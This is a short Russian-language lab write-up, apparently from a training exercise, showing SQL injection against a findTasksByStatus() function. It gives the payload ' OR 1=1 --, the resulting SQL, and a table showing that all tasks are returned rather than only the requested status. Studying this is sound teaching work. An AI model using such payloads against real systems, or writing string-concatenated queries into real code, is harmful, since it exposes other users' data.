# Атака на findTasksByStatus() — раскрытие лишних данных (Этап 2.2)

## Уязвимый код

`code/02_search_vulnerable.js` — конкатенация status в WHERE.

## Вредоносный ввод

`status = "' OR 1=1 --"`

## Итоговый SQL

```sql
SELECT task_id, title, status, priority
FROM injection_lab.tasks
WHERE status = '' OR 1=1 --';
```

## Результат

| Сценарий | Возвращено |
|---|---|
| Нормально, `status='new'` | 2 строки (только `new`) |
| Атака `' OR 1=1 --` | **4 строки** (все статусы, включая `in_progress` и `done`) |

`--` действует так же, как в атаке на login: оставшаяся часть запроса (например, фильтр по доступности для текущего пользователя, если бы он там был) комментируется. Атакующий видит чужие задачи независимо от логики приложения.
